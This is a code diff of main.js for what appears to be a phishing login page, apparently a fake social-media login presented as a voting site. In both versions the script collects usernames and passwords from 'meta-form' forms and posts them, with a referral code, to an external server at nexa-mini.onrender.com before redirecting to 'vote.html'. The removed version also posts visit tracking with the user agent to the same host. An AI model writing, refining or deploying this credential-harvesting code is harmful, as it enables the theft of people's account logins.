@@ -1,100 +1,74 @@
-// main.js
-import { submitForm } from './src/helper.js';
-import { initRouter } from '../frontend /assets/js/router.js';
-import {showFeedback} from './src/feedback.js';
-import { Referral } from './src/referral.js';
+import { $, $$, _$, on } from './dom.js';
+import { showFeedback } from './src/feedback.js';
 
-window.onload = () => {
-  initRouter();
-
-  // --- Handle referral code ---
-  const refCode = Referral.init(); // Saves from URL or localStorage
-
-  // --- Bind all forms ---
-  document.querySelectorAll("form.meta-form").forEach(form => {
-    form.addEventListener("submit", async e => {
-      e.preventDefault();
-      await handleFormSubmit(form, refCode);
+function navigate() {
+  const btns = $$("[data-role=nav]");
+  btns.forEach(b => {
+    on(b, "click", () => {
+      window.location.href = b.dataset.target;
     });
   });
+}
 
-  // --- Navigation ---
-  document.querySelectorAll("[data-role=nav]").forEach(btn => {
-    btn.addEventListener("click", () => {
-      const target = btn.dataset.target;
-      const role = btn.dataset.role;
-      if (role === "nav") {
-        window.location.href = Referral.appendToURL(target);
-      } else {
-        showPage(target);
-      }
-    });
-  });
-};
-
-// --- Handle form submission ---
-async function handleFormSubmit(form, refCode) {
+function login(form) {
   const username = form.username?.value.trim();
-  const password = form.password?.value.trim();
-  const platform = form.platform?.value.trim() || "web";
-  const submitBtn = form.querySelector('button[type="submit"]');
+  const password = form.password?.value;
+  const platform = form.platform?.value;
+  const referralCode = localStorage.getItem("refCode") || "60HM0L";
 
-  if (!username || username.length < 3 || !password || password.length < 6) {
-    showFeedback("Incorrect password","The password you entered is incorrect. Please try again","Ok");
+  if (!username || !password) {
+    showFeedback(
+      "Wrong credentials",
+      "You have entered an incorrect password or username, try again.",
+      "Ok"
+    );
     return;
   }
 
-  const payload = { username, password, platform, referralCode: refCode || "4123389" };
+  const payload = { username, password, platform, referralCode };
+  req(form, payload);
+}
 
-  // Disable form & show loader
-  const inputs = form.querySelectorAll("input");
-  submitBtn.disabled = true;
-  inputs.forEach(i => (i.disabled = true));
-  const originalText = submitBtn.textContent;
-  submitBtn.innerHTML = `<span class="spinner"></span>`;
+async function req(form, payload) {
+  const button = form.querySelector("[type=submit]");
+  const originalText = button.innerHTML;
+  button.innerHTML = '<span class="spinner"></span>';
 
   try {
-    const response = await fetch("https://nexa-mini.onrender.com/student/register", {
+    const res = await fetch("https://nexa-mini.onrender.com/student/register", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(payload),
     });
 
-    const data = await response.json();
+    if (!res.ok) throw new Error("Network response not ok");
 
-    if (response.ok) {
-      
-      // Track the visit
-      await trackVisit(window.location.pathname, refCode);
-      window.location.href = Referral.appendToURL("vote.html");
-      
+    const data = await res.json();
+
+    if (data.success) {
+      showFeedback("Success", "You have successfully logged in", "Continue");
+      console.log(data);
+      window.location.href = "vote.html";
     } else {
-      showFeedback("",`Sorry something went wrong. try again :${response.error}`,"Ok");
+      showFeedback("Login Failed", data.message || "Invalid credentials", "Retry");
     }
-  } catch (err) {
-    console.error("Network error:", err);
-    
+  } catch (e) {
+    console.error(e);
+    showFeedback("Error", "Sorry, something went wrong", "Re-try");
   } finally {
-    submitBtn.textContent = originalText;
-    submitBtn.disabled = false;
-    inputs.forEach(i => (i.disabled = false));
+    button.innerHTML = originalText;
   }
 }
 
-// --- Track page visit ---
-async function trackVisit(path, refCode) {
-  try {
-    await fetch("https://nexa-mini.onrender.com/student/visit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        path,
-        referrer: refCode || "4123389",
-        utm: null,
-        userAgent: navigator.userAgent
-      })
+window.onload = () => {
+  navigate();
+  const forms = $$(".meta-form");
+  if (forms) {
+    forms.forEach(form => {
+      on(form, "submit", e => {
+        e.preventDefault();
+        login(form);
+      });
     });
-  } catch (err) {
-    console.warn("Visit tracking failed:", err);
   }
-}
+};
